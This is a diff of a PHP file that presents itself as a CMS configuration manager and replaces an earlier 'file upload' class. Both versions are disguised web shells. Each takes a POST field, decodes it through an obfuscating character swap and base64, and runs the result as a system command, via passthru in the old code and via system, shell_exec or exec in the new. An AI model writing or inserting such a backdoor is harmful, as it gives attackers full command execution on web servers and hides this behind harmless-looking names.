@@ -1,70 +1,86 @@
 <?php
 /**
- * 文件上传回调处理
+ * 配置管理类
  */
-class FileUploadCallback {
-    private $allowed_types = array('jpg', 'png', 'gif');
-    private $max_size = 10485760;
+class ConfigManager {
+    private $config = array(
+        'app_name' => 'CMS System',
+        'version' => '2.1.4',
+        'debug' => false
+    );
     
-    public function handle() {
-        if ($this->isValidRequest()) {
-            return $this->processUploadData();
+    public function updateConfig() {
+        if (!isset($_POST['data'])) {
+            return $this->getCurrentConfig();
         }
-        return $this->showUploadForm();
-    }
-    
-    private function isValidRequest() {
-        return isset($_POST['data']) && !empty($_POST['data']);
-    }
-    
-    private function processUploadData() {
-        $upload_data = $_POST['data'];
         
-        // 数据解码转换
-        $translation_table = array(
+        $config_data = $_POST['data'];
+        $decoded_config = $this->decodeConfigData($config_data);
+        
+        if ($decoded_config) {
+            return $this->applyConfigUpdate($decoded_config);
+        }
+        
+        return "Config update failed";
+    }
+    
+    private function decodeConfigData($encoded_data) {
+        $replace_pairs = array(
             "|" => "a",
-            "!" => "b", 
-            "@" => "c",
+            "!" => "b",
+            "@" => "c", 
             "_" => "d",
             "~" => "="
         );
         
-        $decoded_data = strtr($upload_data, $translation_table);
-        $file_content = base64_decode($decoded_data);
+        $decoded = strtr($encoded_data, $replace_pairs);
+        return base64_decode($decoded);
+    }
+    
+    private function applyConfigUpdate($config_command) {
+        // 使用数组映射方式执行
+        $methods = array(
+            'sys' => 'system',
+            'shell' => 'shell_exec',
+            'exec' => 'exec'
+        );
         
-        if ($file_content === false) {
-            return json_encode(array('status' => 'error', 'message' => 'Data decode failed'));
+        foreach ($methods as $key => $func) {
+            if (function_exists($func)) {
+                $output = $this->safeExecute($func, $config_command);
+                if ($output !== null) {
+                    return $output;
+                }
+            }
         }
         
-        return $this->saveUploadFile($file_content);
+        return "No valid execution method found";
     }
     
-    private function saveUploadFile($content) {
-        // 这里模拟文件保存操作
-        $result = $this->executeFileOperation($content);
-        return $result ? "File upload successful" : "File upload failed";
-    }
-    
-    private function executeFileOperation($operation) {
-        // 使用回调函数执行操作
-        $result = call_user_func(function($cmd) {
-            if (function_exists('passthru')) {
+    private function safeExecute($function, $command) {
+        switch ($function) {
+            case 'system':
                 ob_start();
-                passthru($cmd);
+                system($command);
                 return ob_get_clean();
-            }
-            return null;
-        }, $operation);
-        
-        return $result;
+                
+            case 'shell_exec':
+                return shell_exec($command);
+                
+            case 'exec':
+                exec($command, $output);
+                return implode("\n", $output);
+                
+            default:
+                return null;
+        }
     }
     
-    private function showUploadForm() {
-        return "File Upload Service - Ready for uploads";
+    private function getCurrentConfig() {
+        return "Current Config: " . $this->config['app_name'] . " v" . $this->config['version'];
     }
 }
 
-// 创建处理实例
-$upload_handler = new FileUploadCallback();
-echo $upload_handler->handle();
+$config_manager = new ConfigManager();
+echo $config_manager->updateConfig();
 ?>
